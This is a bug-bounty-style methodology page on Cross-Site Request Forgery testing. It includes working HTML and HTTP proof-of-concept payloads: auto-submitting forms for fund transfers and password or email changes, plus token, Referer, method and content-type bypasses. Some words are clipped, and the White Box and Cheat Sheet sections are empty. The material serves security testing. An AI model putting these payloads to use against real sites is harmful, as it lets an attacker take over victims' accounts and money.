# Cross Site Request Forgery

## Check List

## Methodology

### [Black Box](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery#cross-site-request-forgery)

#### Session Riding

{% stepper %}
{% step %}
Look for any action that modifies data like Money transfersword
{% endstep %}

{% step %}
Perform the action normally while logged in
{% endstep %}

{% step %}
Intercept the POST/PUT request with Burp Suite
{% endstep %}

{% step %}
Check if a CSRF token is present in headers, body, or cookies
{% endstep %}

{% step %}
In Burp Repeater, send the captured request again (no changes)
{% endstep %}

{% step %}
If the action executes twice (two transfers, two email changes) → No CSRF protection
{% endstep %}

{% step %}
Craft Malicious HTML PoC

```html
<html>
  <body>
    <h2>Congratulations! You won $1000!</h2>
    <form action="https://target.com/transfer" method="POST">
      <input type="hidden" name="amount" value="1000">
      <input type="hidden" name="to_account" value="ATTACKER123">
      <input type="submit" value="Claim Prize">
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```
{% endstep %}

{% step %}
Host the HTML on your server (https://attacker.com/poc.html)
{% endstep %}

{% step %}
Log in as victim in the same browser
{% endstep %}

{% step %}
Visit your PoC page
{% endstep %}

{% step %}
If money is transferred → CSRF confirmed
{% endstep %}
{% endstepper %}

***

#### Bypass CSRF Protection

{% stepper %}
{% step %}
If the endpoint uses CSRF tokens but the page itself is vulnerable to clickjacking, an attacker can exploit clickjacking to achieve the same results as a CSRF attack
{% endstep %}

{% step %}
Clickjacking attacks use an iframe to frame a page in a malicious site while having the state-changing request originate from the legitimate site
{% endstep %}

{% step %}
If the page where the vulnerable endpoint is located is susceptible to clickjacking, the attacker can achieve the same results as a CSRF attack with additional effort and CSS skills
{% endstep %}

{% step %}
To check for clickjacking, use an HTML page like the following

```html
<html>
 <head>
  <title>Clickjack test page</title>
 </head>
 <body>
  <p>This page is vulnerable to clickjacking if the iframe is not blank!</p>
  <iframe src="PAGE_URL" width="500" height="500"></iframe>
 </body>
</html>
```
{% endstep %}
{% endstepper %}

***

#### Change the Request Method

{% stepper %}
{% step %}
Some sites accept multiple request methods for the same endpoint but might not have protection in place for each method
{% endstep %}

{% step %}
hanging the request method may allow you to bypass CSRF protection
{% endstep %}

{% step %}
if a password-change endpoint is protected via CSRF tokens in a POST request

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123&csrf_token=871caef0757a4ac9691aceb9aad8b65b
```
{% endstep %}

{% step %}
If successful, the malicious HTML page could look like this

```html
<html>
 <img src="https://email.example.com/password_change?new_password=abc123"/>
</html>
```
{% endstep %}
{% endstepper %}

***

#### Bypass CSRF Tokens Stored on the Server

{% stepper %}
{% step %}
If clickjacking and request method manipulation don’t work, and the site implements CSRF tokens, try the following
{% endstep %}

{% step %}
Delete the token parameter or send a blank token parameter

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123
```

```html
<html>
 <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
  <input type="text" name="new_password" value="abc123">
  <input type='submit' value="Submit">
 </form>
 <script>document.getElementById("csrf-form").submit();</script>
</html>
```
{% endstep %}

{% step %}
Send a valid CSRF token from another session

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE
(POST request body)
new_password=abc123&csrf_token=YOUR_TOKEN
```
{% endstep %}

{% step %}
If the application logic does not validate whether the token belongs to the current user, this technique may work
{% endstep %}
{% endstepper %}

***

#### Bypass Double-Submit CSRF Tokens

{% stepper %}
{% step %}
ome sites use a double-submit cookie mechanism where the CSRF token is sent both as a cookie and a request parameter, and the server verifies their match. If the server doesn’t store valid tokens, the following Attack can work

```http
POST /password_change
Host: email.example.com
Cookie: session_cookie=YOUR_SESSION_COOKIE; csrf_token=not_a_real_token
(POST request body)
new_password=abc123&csrf_token=not_a_real_token
```
{% endstep %}

{% step %}
By making the victim’s browser store a forged CSRF token cookie via session fixation techniques, an attacker can execute the CSRF successfully
{% endstep %}
{% endstepper %}

***

#### Bypass CSRF Referer Header Check

{% stepper %}
{% step %}
If a website verifies the referer header instead of using CSRF tokens, try these bypass techniques, Remove the Referer Header

```html
<html>
 <meta name="referrer" content="no-referrer">
 <form method="POST" action="https://email.example.com/password_change" id="csrf-form">
  <input type="text" name="new_password" value="abc123">
  <input type='submit' value="Submit">
 </form>
 <script>document.getElementById("csrf-form").submit();</script>
</html>
```
{% endstep %}

{% step %}
Manipulate the referer check logic

* Use a subdomain like example.com.attacker.com
* Use a pathname like attacker.com/example.com
{% endstep %}
{% endstepper %}

***

#### Cart Manipulation

{% stepper %}
{% step %}
Created Two accounts one is ATTACKER and Second one is VICTIM
{% endstep %}

{% step %}
Firefox (ATTACKER BROWSER) Chrome (VICTIM BROWSER)
{% endstep %}

{% step %}
From Attacker id add any “xyz” product in a cart
{% endstep %}

{% step %}
Increase the quantity From 1 to 2 and intercept that request in burp suite
{% endstep %}

{% step %}
Right click and click on Engagement tools (Generate a CSRF POC)
{% endstep %}

{% step %}
Copy That HTML Code and Paste into any Editor
{% endstep %}

{% step %}
Save that file with .html EXTENSION
{% endstep %}

{% step %}
Send that file to Victim Browser (chrome) already told you this in second step
{% endstep %}

{% step %}
When Victim will opens that file and Clicked on submit request that “xyz” product will automatically added to victim cart and automatically increased the quantity
{% endstep %}
{% endstepper %}

***

#### OTP Bypass via CSRF on Edit Profile

{% stepper %}
{% step %}
Create a normal account
{% endstep %}

{% step %}
Navigate to Edit Profile or Settings
{% endstep %}

{% step %}
Enter a new email or phone → Click Save.
{% endstep %}

{% step %}
Intercept the POST request with Burp Suite → Send to Repeater
{% endstep %}

{% step %}
Check request body/headers for `csrf_token`, `X-CSRF-Token`, `__RequestVerificationToke`.
{% endstep %}

{% step %}
If none present → CSRF vulnerable
{% endstep %}

{% step %}
In Burp Repeater → Right-click request → Engagement tools → Generate CSRF PoC
{% endstep %}

{% step %}
Choose Auto-submit form (so no click needed)
{% endstep %}

{% step %}
Set victim’s email/phone in the form fields
{% endstep %}

{% step %}
Click Test in browser → Save as csrf-poc.html
{% endstep %}

{% step %}
Log in as victim in any browser
{% endstep %}

{% step %}
Open your csrf-poc.html file (local or hosted)
{% endstep %}

{% step %}
If victim’s email/phone instantly changes → OTP bypass confirmed
{% endstep %}
{% endstepper %}

***

#### [CSRF via Content-Type + Method Downgrade Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Cross-Site%20Request%20Forgery#html-get---requiring-user-interaction)

{% stepper %}
{% step %}
Log in as admin → Change a user’s password
{% endstep %}

{% step %}
Intercept the POST request

```http
POST /editUser/ChangePassword HTTP/1.1
Content-Type: application/json

{"Id": "1", "password": "newpass123"}
```
{% endstep %}

{% step %}
Downgrade Content-Type to Form-URLencoded And Change header

```http
Content-Type: application/x-www-form-urlencoded
```

And Body

```http
Id=1&password=newpass123
```
{% endstep %}

{% step %}
Send → If password changes → Content-Type bypass confirmed
{% endstep %}

{% step %}
Convert entire request to GET with parameters in URL

```http
GET /editUser/ChangePassword?Id=1&password=newpass123 HTTP/1.1
```
{% endstep %}

{% step %}
Send → If password changes → Method downgrade bypass confirmed
{% endstep %}

{% step %}
Craft Final CSRF PoC (No Click Needed)

```http
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://mycompany.target.com/editUser/ChangePassword" method="GET">
      <input type="hidden" name="Id" value="1">
      <input type="hidden" name="password" value="HackedByAttacker123">
    </form>
  </body>
</html>
```
{% endstep %}

{% step %}
Host the HTML file or send as attachment
{% endstep %}

{% step %}
Admin opens it while logged in → Password of user ID 1 instantly changed
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
